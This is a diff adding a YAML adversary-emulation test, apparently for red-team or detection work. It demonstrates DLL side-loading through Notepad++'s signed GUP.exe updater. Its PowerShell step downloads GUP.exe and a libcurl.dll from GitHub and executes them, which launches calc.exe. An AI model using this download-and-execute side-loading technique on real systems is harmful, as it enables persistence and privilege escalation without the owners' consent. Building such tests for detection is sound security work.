@@ -1,0 +1,62 @@
+---
+api_version: 2.0
+uuid: a0dbea02-4978-4318-9af7-1aef1e2d2409
+name: DLL Side-Loading using the Notepad++ GUP.exe binary
+description: |
+  GUP is an open source signed binary used by Notepad++ for software updates, and is vulnerable to DLL Side-Loading, thus enabling the libcurl dll to be loaded.
+  Upon execution, calc.exe will be opened.
+  Derived from https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/T1574.002.md#atomic-test-1---dll-side-loading-using-the-notepad-gupexe-binary
+requirements:
+  platforms:
+    - os: windows
+mitre:
+  tactics:
+    - TA0003 Persistence / TA0004 Privilege Escalation
+  techniques:
+    - T1574 Hijack Execution Flow
+  subtechniques:
+    - T1574.002 DLL Side-Loading
+
+args:
+  - name: process_name
+    description: Name of the created process
+    default: CalculatorApp
+  - name: gup_exe
+    description: GUP is an open source signed binary used by Notepad++ for software updates
+    type: path
+    default: bin\GUP.exe
+  - name: curl_dll
+    description: GUP requires libcurl.dll to function
+    type: path
+    default: bin\libcurl.dll
+
+steps:
+  - name: execute_GUP
+    executor: powershell
+    description: |
+        GUP.exe binary must exist on disk at specified location ({{.Args.gup_exe}}).
+        Downloads GUP.exe, if not provided, and executes binary.
+    inline: |
+      $parent = Split-Path "{{.Args.gup_exe}}" -Parent
+      if (-Not (Test-Path "{{.Args.gup_exe}}")) {
+        New-Item -Type Directory -Path ${parent} -ErrorAction Ignore | Out-Null
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/bin/GUP.exe?raw=true" -OutFile "{{.Args.gup_exe}}"
+        New-Item -ItemType File -Path "${parent}\.downloaded" -ErrorAction ignore | Out-Null
+      }
+      if (-Not (Test-Path "{{.Args.curl_dll}}")) {
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/bin/libcurl.dll?raw=true" -OutFile "${parent}\libcurl.dll"
+          New-Item -ItemType File -Path "${parent}\.downloaded" -ErrorAction ignore | Out-Null
+      } else {
+          Copy-Item -Path "{{.Args.curl_dll}}" -Destination "${parent}\libcurl.dll"
+      }
+
+      &"{{.Args.gup_exe}}"
+
+    cleanup:
+      executor: powershell
+      inline: |
+        stop-process -name {{.Args.process_name}}
+        $parent = Split-Path "{{.Args.gup_exe}}" -Parent
+        if (Test-Path "${parent}\.downloaded"){
+          remove-item -r $parent
+        }
